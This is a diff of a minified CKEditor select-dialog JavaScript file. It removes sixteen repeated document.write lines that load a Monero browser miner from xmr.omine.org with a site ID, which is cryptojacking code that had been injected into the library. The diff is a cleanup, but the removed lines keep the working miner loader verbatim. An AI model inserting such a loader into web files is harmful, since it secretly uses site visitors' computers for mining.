@@ -18,19 +18,3 @@ c=a.getContentElement("info","cmbValue");h(d,b.getValue(),b.getValue(),a.getPare
 onClick:function(){var a=this.getDialog(),b=a.getContentElement("info","cmbName"),c=a.getContentElement("info","cmbValue");j(b,1,a.getParentEditor().document);j(c,1,a.getParentEditor().document)}}]}]},{type:"hbox",widths:["40%","20%","40%"],children:[{type:"button",id:"btnSetValue",label:c.lang.forms.select.btnSetValue,title:c.lang.forms.select.btnSetValue,onClick:function(){var a=this.getDialog(),b=a.getContentElement("info","cmbValue");a.getContentElement("info","txtValue").setValue(b.getValue())}},
 {type:"button",id:"btnDelete",label:c.lang.forms.select.btnDelete,title:c.lang.forms.select.btnDelete,onClick:function(){var a=this.getDialog(),b=a.getContentElement("info","cmbName"),c=a.getContentElement("info","cmbValue"),d=a.getContentElement("info","txtOptName"),a=a.getContentElement("info","txtOptValue");m(b);m(c);d.setValue("");a.setValue("")}},{id:"chkMulti",type:"checkbox",label:c.lang.forms.select.chkMulti,"default":"",accessKey:"M",value:"checked",setup:function(a,b){"select"==a&&this.setValue(b.getAttribute("multiple"));
 CKEDITOR.env.webkit&&this.getElement().getParent().setStyle("vertical-align","middle")},commit:function(a){this.getValue()?a.setAttribute("multiple",this.getValue()):a.removeAttribute("multiple")}}]}]}]}});
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
